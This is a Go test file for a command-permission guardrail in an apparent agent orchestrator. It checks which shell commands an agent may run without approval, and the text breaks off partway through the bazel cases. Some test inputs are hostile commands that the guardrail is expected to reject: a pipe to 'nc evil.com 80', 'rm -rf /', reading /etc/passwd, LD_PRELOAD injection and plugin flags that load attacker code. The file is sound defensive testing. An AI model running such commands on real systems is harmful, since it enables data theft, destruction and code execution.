// Copyright 2026 DoorDash, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package permission_test

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/doordash-oss/agentic-orchestrator/internal/permission"
)

const (
	testWorkDir       = "/project"
	testWritableRoot1 = "/project"
)

var testWritableRoots = []string{testWritableRoot1}

func TestGuardrailClassify_ParserBoundary(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		// Quoted separators — quotes make separators literal, not structural
		{"quoted_amp_as_arg", `echo '&&'`, false},
		{"quoted_pipe_as_arg", `echo '|'`, false},
		{"double_quoted_semicolon", `echo ";"`, false},

		// Foreground chain composition
		{"and_chain", "go test ./... && go vet ./...", true},
		{"or_chain", "go test ./... || go vet ./...", true},
		{"semicolons", "go test ./... ; go vet ./...", true},
		{"newlines", "go test ./...\ngo vet ./...", true},
		{"pipeline", "go test ./... | head -5", false},
		{"pipeline_cat", "go test -v ./... 2>&1 | cat", false},

		// Multiline commands
		{"multiline_chained", "go build ./...\ngo test ./...\ngo vet ./...", true},

		// Path resolution
		{"cd_relative", "cd ./subdir && go test ./...", true},
		{"cd_absolute_within_root", "cd /project/subdir && go test ./...", true},
		{"cd_parent_escape", "cd .. && go test ./...", false},
		{"cd_home_shorthand", "cd ~ && go test", false},
		{"cd_external", "cd /etc && go test", false},
		{"cd_sensitive_env", "cd .env && go test", false},
		{"cd_sensitive_ssh", "cd .ssh && go test", false},
		{"cd_sensitive_git_metadata", "cd .git && go test", false},
		{"cd_sensitive_provider_config", "cd .claude && go test", false},
		{"cd_no_arg", "cd", false},
		{"cd_two_args", "cd ./a ./b", false},

		// Allowed assignments
		{"assignment_gotraceback", "GOTRACEBACK=2 go test ./...", true},
		{"assignment_cgo", "CGO_ENABLED=0 go build ./...", true},
		{"assignment_rust", "RUST_BACKTRACE=1 cargo test", true},
		{"assignment_node_env", "NODE_ENV=test npm test", true},
		{"assignment_multiple", "GOTRACEBACK=2 CGO_ENABLED=0 go test ./...", true},
		{"assignment_secret_name", "API_KEY=foo go test ./...", false},
		{"assignment_secret_value", "NODE_ENV=sk-abc123def456ghij go test ./...", false},
		{"assignment_unknown_name", "FOO=bar go test ./...", false},
		{"assignment_expansion_value", "NODE_ENV=$VAR go test ./...", false},
		// Free-form flag variables that can carry execution-affecting
		// options must defer even with harmless-looking values.
		{"assignment_goflags_removed", "GOFLAGS=-v go test ./...", false},
		{"assignment_goflags_toolexec", "GOFLAGS=-toolexec=./runner go test ./...", false},
		{"assignment_rustflags_removed", "RUSTFLAGS='--cfg evil' cargo test", false},
		{"assignment_cflags_removed", "CFLAGS='-B./toolchain' gcc main.c", false},
		{"assignment_ldflags_removed", "LDFLAGS='-L/tmp/evil' go build ./...", false},

		// Allowed redirections
		{"redirect_devnull", "go test ./... 2>/dev/null", true},
		{"redirect_devnull_space", "go test ./... 2> /dev/null", true},
		{"redirect_stdout_devnull", "go test ./... >/dev/null", true},
		{"redirect_append_devnull", "go test ./... >>/dev/null", true},
		{"redirect_fd", "go test ./... 2>&1", true},
		{"redirect_fd_reverse", "go test ./... 1>&2", true},
		{"redirect_to_file", "go test ./... > /tmp/out", false},
		{"redirect_stderr_to_file", "go test ./... 2> /tmp/err", false},
		{"redirect_input", "go test ./... < input.txt", false},
		{"redirect_heredoc", "cat << EOF", false},

		// Malformed syntax
		{"unclosed_single_quote", "go test 'foo", false},
		{"unclosed_double_quote", `go test "foo`, false},
		{"trailing_and", "go test ./... &&", false},
		{"leading_and", "&& go test ./...", false},
		{"trailing_pipe", "go test ./... |", false},
		{"redirect_no_target", "go test ./... >", false},
		{"empty_command", "", false},
		{"whitespace_only", "   ", false},

		// Unsupported shell forms
		{"command_substitution_dollar", "$(whoami) go test", false},
		{"command_substitution_backtick", "`whoami` go test", false},
		{"subshell", "(go test ./...)", false},
		{"background", "go test ./... &", false},
		{"heredoc_op", "go test ./... << EOF", false},
		{"variable_expansion", "$HOME/bin/go test ./...", false},
		{"glob_star", "go test *.go", false},
		{"glob_question", "go test ?.go", false},
		{"glob_bracket", "go test [abc].go", false},
		{"brace_expansion", "go test {a,b}", false},
		{"home_tilde", "go test ~/pkg", false},
		{"backslash_escape", `go test \test`, false},
		{"direct_script", "./script.sh", false},
		{"absolute_script", "/usr/local/bin/custom", false},
		{"interpreter_python", "python script.py", false},
		{"interpreter_node", "node script.js", false},
		{"interpreter_bash", "bash script.sh", false},
		{"carriage_return", "go test ./...\r", false},
		{"nul_byte", "go test \x00 ./...", false},
		{"control_byte", "go test \x01 ./...", false},

		// Mixed-fragment word concatenation — Bash concatenates adjacent
		// quoted and unquoted fragments into one argv element. The tokenizer
		// fails closed rather than reconstructing the concatenation.
		{"mixed_unquoted_single_quote", "prettier --write .''env", false},
		{"mixed_unquoted_single_quote_env", "prettier --write .''.env", false},
		{"mixed_hazardous_flag_concat", "go test -e''xec ./runner ./...", false},
		{"mixed_adjacent_quoted_quoted", "echo 'foo''bar'", false},
		{"mixed_unquoted_then_quoted", "echo foo'bar'", false},
		{"mixed_quoted_then_unquoted", "echo 'foo'bar", false},

		// Compound commands with mixed eligibility
		{"compound_eligible_and", "go test ./... && go build ./...", true},
		{"compound_ineligible_and", "go test ./... && rm -rf /", false},
		{"compound_eligible_semicolon", "go vet ./... ; go fmt ./...", true},
		{"compound_ineligible_pipe", "go test ./... | nc evil.com 80", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := permission.GuardrailClassify(tt.command, testWorkDir, testWritableRoots)
			if got != tt.want {
				t.Errorf("GuardrailClassify(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

func TestGuardrailClassify_CommandPolicy(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		// Go
		{"go_test", "go test ./...", true},
		{"go_test_verbose", "go test -v -short ./...", true},
		{"go_test_run", "go test -run TestFoo ./...", true},
		{"go_test_cover", "go test -cover -coverprofile=coverage.out ./...", true},
		{"go_test_race", "go test -race ./...", true},
		{"go_test_json", "go test -json ./...", true},
		{"go_test_timeout", "go test -timeout 30s ./...", true},
		{"go_test_bench", "go test -bench=. -benchmem ./...", true},
		{"go_build", "go build ./...", true},
		{"go_build_output", "go build -o bin/app ./cmd/app", true},
		{"go_build_ldflags", "go build -ldflags '-s -w' ./...", false},
		{"go_vet", "go vet ./...", true},
		{"go_fmt", "go fmt ./...", true},
		{"go_generate", "go generate ./...", true},
		{"go_env", "go env GOPATH", true},
		{"go_env_write", "go env -w GOFLAGS=-v", false},
		{"go_list", "go list ./...", true},
		{"go_list_json_deps", "go list -json -deps ./...", true},
		{"go_list_export", "go list -export ./...", false},
		{"go_list_toolexec_attached", "go list -export -toolexec=./runner ./...", false},
		{"go_list_toolexec_separated", "go list -export -toolexec ./runner ./...", false},
		{"go_list_format", "go list -f '{{.ImportPath}}' ./...", false},
		{"go_list_modules", "go list -m all", false},
		{"go_test_exec_hazardous", "go test -exec ./runner ./...", false},
		{"go_run", "go run ./cmd/main.go", false},
		{"go_install", "go install ./...", false},
		{"gofmt", "gofmt -w .", true},
		{"gofmt_rewrite", "gofmt -r 'a[b:] -> a[b:]'", false},
		{"goimports", "goimports -w .", true},
		{"golangci_lint", "golangci-lint run", true},
		{"golangci_lint_enable", "golangci-lint --enable foo run", false},
		{"golangci_lint_cache_clean", "golangci-lint cache clean", false},
		{"staticcheck", "staticcheck ./...", true},

		// Rust
		{"cargo_test", "cargo test", true},
		{"cargo_test_release", "cargo test --release", true},
		{"cargo_test_features", "cargo test --features foo", true},
		{"cargo_build", "cargo build", true},
		{"cargo_check", "cargo check", true},
		{"cargo_check_config", "cargo check --config build.rustc-wrapper=./runner", false},
		{"cargo_clippy", "cargo clippy", true},
		{"cargo_clippy_fix", "cargo clippy --fix", false},
		{"cargo_fmt", "cargo fmt", true},
		{"cargo_fmt_check", "cargo fmt --check", true},
		{"cargo_run", "cargo run", false},
		{"cargo_install", "cargo install foo", false},
		{"rustfmt", "rustfmt src/main.rs", true},
		{"rustfmt_emit", "rustfmt --emit json src/main.rs", false},

		// JS/TS
		{"npm_test", "npm test", true},
		{"npm_test_silent", "npm test --silent", true},
		{"npm_test_passthrough_silent", "npm test -- --silent", false},
		{"pnpm_test_passthrough_quiet", "pnpm test -- --quiet", false},
		{"yarn_test_passthrough_verbose", "yarn test -- --verbose", false},
		{"eslint", "eslint .", true},
		{"eslint_parser", "eslint --parser ./evil.js .", false},
		{"eslint_plugin", "eslint --plugin foo .", false},
		{"eslint_rulesdir", "eslint --rulesdir ./rules .", false},
		{"eslint_formatter_path", "eslint --format ./evil.js .", false},
		{"eslint_formatter_path_attached", "eslint --format=./evil.js .", false},
		{"eslint_formatter_short_path", "eslint -f ./evil.js .", false},
		{"eslint_formatter_short_path_attached", "eslint -f=./evil.js .", false},
		{"eslint_formatter_short_path_compact", "eslint -f./evil.js .", false},
		{"prettier", "prettier --write .", true},
		{"prettier_plugin", "prettier --plugin foo .", false},
		{"tsc", "tsc --noEmit", true},
		{"tsc_project", "tsc -p tsconfig.json", false},
		{"tsc_watch", "tsc --watch", false},
		{"jest", "jest", true},
		{"jest_coverage", "jest --coverage", true},
		{"jest_path", "jest --testPathPattern foo", true},
		{"jest_clear_cache", "jest --clearCache", false},
		{"vitest", "vitest", true},
		{"vitest_run", "vitest --run", true},
		{"vitest_reporter_path", "vitest --reporter ./evil.js", false},
		{"mocha", "mocha", true},
		{"mocha_reporter", "mocha --reporter spec", false},
		{"mocha_reporter_path", "mocha --reporter ./evil.js", false},

		// Python
		{"pytest", "pytest", true},
		{"pytest_verbose", "pytest -v", true},
		{"pytest_keyword", "pytest -k test_foo", true},
		{"pytest_cov", "pytest --cov=src", true},
		{"pytest_cov_config_attached", "pytest --cov-config=evil.ini", false},
		{"pytest_cov_config_separated", "pytest --cov-config evil.ini", false},
		{"pytest_x", "pytest -x", true},
		{"pytest_cache_clear", "pytest --cache-clear", false},
		{"ruff_check", "ruff check .", true},
		{"ruff_format", "ruff format .", true},
		{"ruff_config", "ruff --config foo.toml check .", false},
		{"ruff_check_config", "ruff check --config foo.toml .", false},
		{"ruff_server", "ruff server", false},
		{"ruff_clean", "ruff clean", false},
		{"black", "black .", true},
		{"black_config", "black --config foo.toml .", false},
		{"mypy", "mypy src/", true},
		{"mypy_plugin", "mypy --plugins foo .", false},
		{"mypy_python_executable_attached", "mypy --python-executable=./evil src/", false},
		{"mypy_python_executable_separated", "mypy --python-executable ./evil src/", false},
		{"pylint", "pylint src/", true},
		{"pylint_output_format_custom_short", "pylint -f evil.EvilReporter src/", false},
		{"pylint_output_format_custom_short_eq", "pylint -f=evil.EvilReporter src/", false},
		{"pylint_output_format_custom_short_compact", "pylint -fevil.EvilReporter src/", false},
		{"pylint_output_format_custom_long", "pylint --output-format evil.EvilReporter src/", false},
		{"pylint_output_format_custom_long_eq", "pylint --output-format=evil.EvilReporter src/", false},
		{"pylint_format_alias_custom", "pylint --format=evil.EvilReporter src/", false},
		{"pylint_output_format_builtin_defer", "pylint --output-format=json src/", false},
		{"flake8", "flake8 src/", true},
		{"isort", "isort .", true},
		{"isort_profile", "isort --profile black .", false},
		{"python_script", "python script.py", false},

		// Java/Kotlin
		{"mvn_test", "mvn test", true},
		{"mvn_verify", "mvn verify", true},
		{"mvn_compile", "mvn compile", true},
		{"mvn_skip_tests", "mvn verify -DskipTests", true},
		{"mvn_install", "mvn install", false},
		{"gradle_test", "gradle test", true},
		{"gradle_build", "gradle build", true},
		{"gradle_check", "gradle check", true},
		{"gradle_clean", "gradle clean", false},
		{"kotlinc", "kotlinc src/main.kt", true},
		{"javac", "javac Main.java", true},
		{"ktlint", "ktlint src/", true},

		// C/C++
		{"gcc", "gcc -o main main.c", true},
		{"gpp", "g++ -o main main.cpp", true},
		{"clang", "clang -o main main.c", true},
		{"clangpp", "clang++ -o main main.cpp", true},
		{"clang_format", "clang-format -i main.cpp", true},
		{"clang_format_style_external_file_attached", "clang-format --style=file:/tmp/evil-format main.cpp", false},
		{"clang_format_style_external_file_separated", "clang-format --style file:/tmp/evil-format main.cpp", false},
		{"clang_format_style_external_file_single_dash_attached", "clang-format -style=file:/tmp/evil-format main.cpp", false},
		{"clang_format_style_external_file_single_dash_separated", "clang-format -style file:/tmp/evil-format main.cpp", false},
		{"clang_format_style_sensitive_file_attached", "clang-format --style=file:.env main.cpp", false},
		{"clang_format_style_safe_named", "clang-format --style=Google main.cpp", true},
		{"clang_format_style_safe_named_single_dash", "clang-format -style=Google main.cpp", true},
		{"clang_format_style_safe_file", "clang-format --style=file:configs/clang-format.yaml main.cpp", true},
		{"clang_tidy", "clang-tidy src/*.cpp", false},
		{"clang_tidy_fix", "clang-tidy --fix src/*.cpp", false},
		{"cppcheck", "cppcheck src/", true},
		{"cmake_build", "cmake --build .", true},
		{"cmake_gen", "cmake -S . -B build", true},
		{"cmake_d_compiler_separated", "cmake -D CMAKE_C_COMPILER=./runner -S . -B build", false},
		{"cmake_d_compiler_attached", "cmake -DCMAKE_C_COMPILER=./runner -S . -B build", false},
		{"cmake_d_top_level_includes_separated", "cmake -D CMAKE_PROJECT_TOP_LEVEL_INCLUDES=./evil.cmake -S . -B build", false},
		{"cmake_d_top_level_includes_attached", "cmake -DCMAKE_PROJECT_TOP_LEVEL_INCLUDES=./evil.cmake -S . -B build", false},
		{"cmake_preset_selected_compiler_separated", "cmake --preset evil-compiler", false},
		{"cmake_preset_selected_top_level_include_attached", "cmake --preset=evil-include", false},
		{"cmake_build_native_shell_override", "cmake --build build -- SHELL=./runner", false},
		{"cmake_build_native_clean_target", "cmake --build build -- clean", false},
		{"cmake_build_native_install_target", "cmake --build build -- install", false},

		// Long-running modes
		{"go_test_watch", "go test --watch ./...", false},
		{"npm_test_watch", "npm test --watch", false},
		{"jest_watch", "jest --watch", false},
		{"vitest_ui", "vitest --ui", false},

		// Quoted operands
		{"quoted_arg", "go test '-run' 'TestFoo' ./...", true},
		{"quoted_path", "go test './internal/...'", true},

		// Quoted hazardous flags must defer — quoting does not change flag semantics
		{"quoted_exec_flag", "go test '-exec' ./runner ./...", false},
		{"quoted_eslint_plugin", "eslint '--plugin' evil .", false},
		{"quoted_protoc_plugin", "protoc '--plugin=./evil' foo.proto", false},
		{"quoted_pytest_plugin", "pytest '-p' myplugin", false},
		{"quoted_mocha_require", "mocha '--require' foo", false},
		{"quoted_gcc_plugin", "gcc '-plugin' foo.so main.c", false},

		// Sensitive bare basenames as operands
		{"prettier_write_env", "prettier --write .env", false},
		{"prettier_write_credentials", "prettier --write credentials", false},
		{"black_env", "black .env", false},

		// Helper/plugin flags must defer
		{"pytest_plugin", "pytest -p myplugin", false},
		{"mocha_require", "mocha --require foo", false},
		{"mocha_file", "mocha --file foo.js", false},
		{"gcc_plugin", "gcc -plugin foo.so main.c", false},
		{"gcc_fplugin", "gcc -fplugin=foo.so main.c", false},
		{"clang_plugin", "clang -plugin foo.so main.c", false},
		{"javac_processor", "javac -processor foo Main.java", false},
		{"javac_cp_mixed_pathlist", "javac -cp .:/tmp/processor.jar Main.java", false},
		{"javac_classpath_eq_mixed_pathlist", "javac -classpath=.:/tmp/processor.jar Main.java", false},
		{"javac_sourcepath_mixed_pathlist", "javac -sourcepath src:/tmp/src Main.java", false},
		{"javac_bootclasspath_mixed_pathlist", "javac -bootclasspath .:/tmp/rt.jar Main.java", false},
		{"javac_extdirs_mixed_pathlist", "javac -extdirs lib:/tmp/ext Main.java", false},
		{"javac_endorseddirs_mixed_pathlist", "javac -endorseddirs lib:/tmp/endorsed Main.java", false},
		{"kotlinc_plugin", "kotlinc -plugin foo main.kt", false},
		{"kotlinc_xplugin", "kotlinc -Xplugin=./evil.jar main.kt", false},
		{"kotlinc_xplugin_eq", "kotlinc -Xplugin=evil.jar main.kt", false},
		{"kotlinc_cp_mixed_pathlist", "kotlinc -cp .:/tmp/lib.jar main.kt", false},
		{"kotlinc_classpath_eq_mixed_pathlist", "kotlinc -classpath=.:/tmp/lib.jar main.kt", false},

		// Compiler helper/search-path forms must defer
		{"gcc_b_searchpath", "gcc -B ./toolchain main.c", false},
		{"gcc_xclang", "gcc -Xclang -load evil.so main.c", false},
		{"gcc_mllvm", "gcc -mllvm -load evil.so main.c", false},
		{"clang_xclang", "clang -Xclang -load evil.so main.c", false},
		{"clang_mllvm", "clang -mllvm -load evil.so main.c", false},
		{"gcc_xlinker", "gcc -Xlinker --plugin evil.so main.c", false},
		{"gcc_fpass_plugin", "gcc -fpass-plugin=evil.so main.c", false},
		{"clang_thinlto_distributor", "clang -flto=thin -fuse-ld=lld -fthinlto-distributor=./runner main.c", false},
		{"clang_fuse_ld", "clang -fuse-ld=./runner main.c", false},
		{"clang_lto_thin", "clang -flto=thin -c main.c", false},

		// Compiler strict mode: attached hazardous flag forms must defer
		{"gcc_b_attached", "gcc -B./toolchain main.c", false},
		{"gcc_wl_plugin", "gcc -Wl,--plugin,evil.so main.c", false},
		{"gcc_wl_plugin_eq", "gcc -Wl,--plugin=evil.so main.c", false},
		{"gcc_wl_single_dash_plugin", "gcc -Wl,-plugin,./evil.so main.c", false},
		{"gcc_wl_single_dash_plugin_eq", "gcc -Wl,-plugin=./evil.so main.c", false},
		{"gcc_wp_external_depfile", "gcc -Wp,-MD,/tmp/deps main.c", false},
		{"gcc_wa_external_output", "gcc -Wa,-o,/tmp/asm.o main.c", false},
		{"gcc_wl_external_map", "gcc -Wl,-Map,/tmp/link.map main.c", false},
		// Compiler strict mode: safe flags must still pass
		{"gcc_safe_fPIC", "gcc -fPIC -c main.c", true},
		{"gcc_safe_fno_common", "gcc -fno-common -c main.c", true},
		{"gcc_safe_Wno_unused", "gcc -Wno-unused -c main.c", true},
		{"gcc_safe_I_attached", "gcc -I./include -c main.c", true},
		{"gcc_safe_D_attached", "gcc -DFOO=1 -c main.c", true},
		{"gcc_d_password_attached", "gcc -DPASSWORD=hunter2 -c main.c", false},
		{"gcc_d_api_key_attached", "gcc -DAPI_KEY=hunter2 -c main.c", false},
		{"gcc_d_secret_token_attached", "gcc -DSECRET_TOKEN=hunter2 -c main.c", false},
		{"gcc_safe_O2", "gcc -O2 -c main.c", true},
		{"gcc_safe_std", "gcc -std=c++17 -c main.cpp", true},
		{"gcc_safe_m64", "gcc -m64 -c main.c", true},
		{"gcc_output_git_hook", "gcc -o .git/hooks/pre-commit main.c", false},
		// Compiler strict mode: unknown flags must defer
		{"gcc_unknown_flag", "gcc --unknown-flag main.c", false},
		{"gcc_unknown_short", "gcc -Z main.c", false},
		// Compiler flags not in the safe set or safe prefixes must defer
		// even though they are legitimate GCC include-path flags
		{"gcc_isystem_defers", "gcc -isystem ./include -c main.c", false},
		{"gcc_include_defers", "gcc -include foo.h -c main.c", false},

		// go vet strict mode: -vettool and -toolexec must defer
		{"go_vet_vettool_eq", "go vet -vettool=./runner ./...", false},
		{"go_vet_vettool_separate", "go vet -vettool ./runner ./...", false},
		{"go_vet_toolexec", "go vet -toolexec ./runner ./...", false},
		{"go_vet_safe", "go vet -v ./...", true},
		{"go_vet_unknown_flag", "go vet -unknown ./...", false},

		// Protoc strict mode: unknown --NAME_out flags must defer
		{"protoc_evil_out", "protoc --evil_out=. foo.proto", false},
		{"protoc_plugin_eq", "protoc --plugin=./evil foo.proto", false},
		{"protoc_safe_go_out", "protoc --go_out=. foo.proto", true},
		{"protoc_safe_I_attached", "protoc -I./proto --go_out=. foo.proto", true},

		// air (live-reload daemon) must defer
		{"air", "air", false},

		// Inline value skipping: safe =value flag must not consume next arg,
		// so a prohibited flag immediately following is still validated.
		{"go_test_run_eq_then_exec_eq", "go test -run=Test -exec=/tmp/runner ./...", false},
		{"go_test_run_eq_safe", "go test -run=TestFoo ./...", true},
		{"bazel_jobs_eq_then_override_eq", "bazel test --jobs=1 --override_repository=repo=/tmp/evil //...", false},
		{"bazel_jobs_eq_safe", "bazel test --jobs=1 //target", true},

		// Response-file indirection must defer (cannot inspect expanded contents)
		{"gcc_response_file", "gcc @options main.c", false},
		{"clang_tidy_response_file", "clang-tidy @params src/main.cpp", false},
		{"cppcheck_response_file", "cppcheck @options src/", false},

		// Go nested pass-through flags must defer — their values can carry
		// arbitrary sub-tool flags that bypass the policy. -gcflags and
		// -asmflags pass flags to the Go compiler/assembler; -compiler selects
		// an alternative compiler (e.g., gccgo) with its own plugin loading.
		{"go_build_ldflags_extld", "go build -ldflags '-linkmode=external -extld=./runner' ./...", false},
		{"go_test_gccgoflags_defer", "go test -gccgoflags '-B./toolchain' ./...", false},
		{"go_build_gcflags_defer", "go build -gcflags '-B' ./...", false},
		{"go_test_gcflags_defer", "go test -gcflags '-B' ./...", false},
		{"go_build_asmflags_defer", "go build -asmflags '-I' ./...", false},
		{"go_test_asmflags_defer", "go test -asmflags '-I' ./...", false},
		{"go_build_compiler_defer", "go build -compiler gccgo ./...", false},
		{"go_test_compiler_defer", "go test -compiler gccgo ./...", false},
		{"go_vet_compiler_defer", "go vet -compiler gccgo ./...", false},

		// Code-loading tools in strict tier: plugin/helper flags must defer
		{"pylint_load_plugins", "pylint --load-plugins=evil src/", false},
		{"pylint_init_hook", "pylint --init-hook x src/", false},
		{"pylint_safe_verbose", "pylint -v src/", true},
		{"pylint_safe_enable", "pylint --enable=C0102 src/", true},
		{"clang_tidy_load", "clang-tidy --load=./evil.so src/main.cpp", false},
		{"clang_tidy_extra_arg", "clang-tidy --extra-arg=-fplugin src/main.cpp", false},
		{"clang_tidy_config_extra_args_before_attached_quoted", `clang-tidy "--config={ExtraArgsBefore: [-Xclang, -load, -Xclang, ./evil.so]}" src/main.cpp`, false},
		{"clang_tidy_config_extra_args_attached_quoted", `clang-tidy '--config={ExtraArgs: [-Xclang, -load, -Xclang, ./evil.so]}' src/main.cpp`, false},
		{"clang_tidy_config_extra_args_before_separated_quoted", `clang-tidy --config "{ExtraArgsBefore: [-Xclang, -load, -Xclang, ./evil.so]}" src/main.cpp`, false},
		{"clang_tidy_config_file_attached", "clang-tidy --config-file=evil.yaml src/main.cpp", false},
		{"clang_tidy_config_file_separated", "clang-tidy --config-file evil.yaml src/main.cpp", false},
		{"clang_tidy_fix_strict", "clang-tidy --fix src/main.cpp", false},
		{"clang_tidy_safe_checks", "clang-tidy --checks '*' src/main.cpp", true},
		{"clang_tidy_safe_quiet", "clang-tidy --quiet src/main.cpp", true},
		{"cppcheck_addon", "cppcheck --addon=./evil.py src/", false},
		{"cppcheck_library", "cppcheck --library=evil.cfg src/", false},
		{"cppcheck_safe_enable", "cppcheck --enable=all src/", true},
		{"cppcheck_safe_D", "cppcheck -DFOO src/", true},
		{"cppcheck_d_password_attached", "cppcheck -DPASSWORD=hunter2 src/", false},
		{"javac_j_javaagent", "javac -J-javaagent:./evil.jar Main.java", false},
		{"javac_safe_d", "javac -d build Main.java", true},
		{"javac_safe_xlint", "javac -Xlint:all Main.java", true},
		{"kotlinc_j_javaagent", "kotlinc -J-javaagent:./evil.jar main.kt", false},
		{"kotlinc_safe_d", "kotlinc -d build main.kt", true},
		{"ktlint_ruleset_eq", "ktlint --ruleset=./evil.jar src/main.kt", false},
		{"ktlint_ruleset_separate", "ktlint --ruleset ./evil.jar src/main.kt", false},
		{"ktlint_ruleset_short", "ktlint -R ./evil.jar src/main.kt", false},

		// Buf input operands must be root-bounded and non-sensitive
		{"buf_lint_external", "buf lint /etc/passwd", false},
		{"buf_generate_external", "buf generate /tmp/external", false},
		{"buf_lint_sensitive", "buf lint .env", false},
		{"buf_lint_safe", "buf lint src/", true},

		// Rooted paths
		{"rooted_path", "go test /project/internal/...", true},
		{"external_path", "go test /tmp/test/...", false},
		{"parent_path", "go test ../other/...", false},
		{"git_metadata_path", "go test .git/config", false},
		{"provider_config_path", "go build -o .claude/settings.json ./cmd/app", false},
		{"codex_config_path", "go build -o .codex/config.toml ./cmd/app", false},

		// Unknown binaries
		{"unknown_binary", "foobarbaz test", false},
		{"custom_tool", "my-tool --flag", false},

		// Generators
		{"mockgen", "mockgen -source=foo.go -destination=mock.go", true},
		{"mockgen_exec_only", "mockgen -exec_only ./runner", false},
		{"stringer", "stringer -type=Color", true},
		{"protoc", "protoc --go_out=. foo.proto", true},
		{"protoc_plugin", "protoc --plugin=protoc-gen-foo=./foo foo.proto", false},
		{"sqlc", "sqlc generate", false}, // sqlc has no subcommand in simple table
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := permission.GuardrailClassify(tt.command, testWorkDir, testWritableRoots)
			if got != tt.want {
				t.Errorf("GuardrailClassify(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

func TestGuardrailClassify_ProjectTargets(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		// Make
		{"make_test", "make test", true},
		{"make_lint", "make lint", true},
		{"make_build", "make build", true},
		{"make_format", "make format", true},
		{"make_test_unit", "make test-unit", true},
		{"make_mixed_case_test_unit", "make Test-Unit", true},
		{"make_unit_test", "make unit-test", true},
		{"make_lint_fix", "make lint:fix", true},
		{"make_ci_build", "make ci_build", true},
		{"make_multiple", "make test lint build", true},
		{"make_shell_override_after_target", "make test SHELL=./foo-test", false},
		{"make_shell_override_before_target", "make SHELL=./foo-test test", false},
		{"make_append_override", "make test FOO+=unit-test", false},
		{"make_install", "make install", false},
		{"make_clean", "make clean", false},
		{"make_test_remove", "make test-remove", false},
		{"make_test_uninstall", "make test-uninstall", false},
		{"make_test_destroy", "make test-destroy", false},
		{"make_test_delete", "make test-delete", false},
		{"make_deploy", "make deploy", false},
		{"make_test_deploy", "make test-deploy", false},
		{"make_mixed_case_test_deploy", "make test-Deploy", false},
		{"make_watch", "make watch", false},
		{"make_no_arg", "make", false},
		{"make_silent_no_target", "make --silent", false},
		{"make_jobs_no_target", "make -j4", false},
		{"make_jobs_separated_no_target", "make -j 4", false},
		{"make_makefile", "make -f other.mk test", false},
		// --flag=value forms must also defer (bypass fix)
		{"make_file_eq", "make --file=/tmp/evil.mk test", false},
		{"make_directory_eq", "make --directory=/tmp/evil test", false},
		{"make_include_eq", "make --include-dir=/tmp/evil test", false},
		{"make_unknown_flag", "make --unknown-flag test", false},
		// Safe make flags should still be eligible
		{"make_jobs", "make -j 4 test", true},
		{"make_jobs_combined", "make -j4 test", true},
		{"make_jobs_assignment_override", "make -j SHELL=./foo-test test", false},
		{"make_silent", "make -s test", true},

		// Just
		{"just_test", "just test", true},
		{"just_lint_check", "just lint-check", true},
		{"just_build", "just build", true},
		{"just_assignment_override", "just test shell=./foo-test", false},
		{"just_deploy", "just deploy", false},
		{"just_test_remove", "just test-remove", false},
		{"just_test_uninstall", "just test-uninstall", false},
		{"just_mixed_case_release", "just lint-Release", false},
		{"just_clean", "just clean", false},
		{"just_quiet_no_target", "just --quiet", false},
		{"just_shell", "just --shell bash test", false},
		// --flag=value forms must also defer
		{"just_justfile_eq", "just --justfile=/tmp/evil.just test", false},
		{"just_command_eq", "just --command='evil' test", false},
		{"just_unknown_flag", "just --unknown-flag test", false},

		// Task (Taskfile)
		{"task_test", "task test", true},
		{"task_lint_fix", "task lint:fix", true},
		{"task_build", "task build", true},
		{"task_assignment_override", "task test SHELL=./foo-test", false},
		{"task_deploy", "task deploy", false},
		{"task_test_delete", "task test-delete", false},
		{"task_test_destroy", "task test-destroy", false},
		{"task_mixed_case_publish", "task build-Publish", false},
		{"task_silent_no_target", "task --silent", false},
		{"task_taskfile", "task --taskfile other.yml test", false},
		// --flag=value forms must also defer
		{"task_taskfile_eq", "task --taskfile=/tmp/evil.yml test", false},
		{"task_dir_eq", "task --dir=/tmp/evil test", false},
		{"task_unknown_flag", "task --unknown-flag test", false},

		// Bazel
		{"bazel_test", "bazel test //target", true},
		{"bazel_build", "bazel build //target", true},
		{"bazel_coverage", "bazel coverage //target", true},
		{"bazel_query", "bazel query 'deps(//target)'", true},
		{"bazel_run", "bazel run //target", false},
		{"bazel_no_arg", "bazel", false},
		// Strict mode: = forms and unknown flags must defer
		{"bazel_override_repository_eq", "bazel build --override_repository=repo=/tmp/evil //target", false},
		{"bazel_spawn_strategy_eq", "bazel build --spawn_strategy=standalone //target", false},
		{"bazel_strategy_eq", "bazel build --strategy=standalone //target", false},
		{"bazel_profile_eq", "bazel build --profile=/tmp/evil //target", false},
		{"bazel_unknown_flag", "bazel build --unknown-flag //target", false},
		{"bazel_safe_keep_going", "bazel build --keep_going //target", true},
		{"bazel_missing_target", "bazel build --keep_going", false},
		{"bazel_invalid_target", "bazel build delete-all", false},
		{"bazel_external_repo_target", "bazel build @external//pkg:target", false},
		{"bazel_build_deploy_label", "bazel build //:deploy", false},
		{"bazel_build_install_label", "bazel build //tools:install", false},
		{"bazel_test_release_label", "bazel test //ops:release", false},
		{"bazel_test_remove_label", "bazel test //ops:test-remove", false},
		{"bazel_build_destroy_label", "bazel build //ops:build-destroy", false},
		// Opaque pass-through options must defer — they can forward
		// plugin-loading flags, select arbitrary executables, or inject
		// environment variables that bypass the guardrail.
		{"bazel_test_arg", "bazel test --test_arg=delete-all //target", false},
		{"bazel_test_arg_separated", "bazel test --test_arg delete-all //target", false},
		{"bazel_test_env", "bazel test --test_env=LD_PRELOAD=./evil.so //target", false},
		{"bazel_config", "bazel test --config=repo_defined //target", false},
		{"bazel_disk_cache_remote", "bazel build --disk_cache=grpc://external.example //target", false},
